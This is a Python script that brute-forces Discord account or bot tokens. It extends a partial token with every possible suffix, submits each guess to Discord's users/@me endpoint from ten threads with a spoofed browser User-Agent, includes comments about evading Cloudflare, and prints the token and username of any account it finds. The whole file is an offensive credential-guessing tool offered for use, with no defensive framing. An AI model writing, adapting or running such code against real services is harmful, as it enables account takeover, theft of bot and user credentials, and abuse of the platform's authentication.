import concurrent.futures
import random
import sys
import urllib
from json import loads
from urllib.request import Request

from tqdm import tqdm

HOWLONGATOKENIS = 59
CurrentToken = input("Enter your token: ")
guessLength = HOWLONGATOKENIS - len(CurrentToken)
possibleChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890._"
totalCombos = len(possibleChars) ** guessLength
print("Total possible combinations: " + str(totalCombos))
input("Press enter to continue...")


# generate combination from iteration number
def generateCombos(guessLength, iteration):
    combos = []
    for i in range(guessLength):
        combos.append(possibleChars[iteration % len(possibleChars)])
        iteration = iteration // len(possibleChars)
    return "".join(combos)


possibleChars = list(possibleChars)
random.shuffle(possibleChars)
possibleChars = "".join(possibleChars)


def validateToken(token, bot=True):
    if bot:
        token = "Bot " + token
    req = Request("https://discord.com/api/v9/users/@me", headers={
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
        # beware cloudflare
    })
    try:
        response = urllib.request.urlopen(req)
        # json to dict
        body = response.read().decode("utf-8")
        data = loads(body)
        if bot:
            token = token[4:]
        data["token"] = token
        if response.code == 200:
            return data
    except Exception as e:
        pass
    return None


def main():
    futures = []
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)  # beware cloudflare
    for i in range(totalCombos):
        combos = generateCombos(guessLength, i)
        combos = CurrentToken + combos
        futures.append(executor.submit(validateToken, combos))

    with tqdm(total=totalCombos) as pbar:
        for future in concurrent.futures.as_completed(futures):
            try:
                data = future.result()
                if data:
                    print(f'Found token: {data["token"]}, {data["username"]}#{data["discriminator"]}')
                    pbar.update(totalCombos - pbar.n)
                    pbar.close()
                    sys.exit(0)

            except:
                pass
            pbar.update(1)


if __name__ == '__main__':
    main()
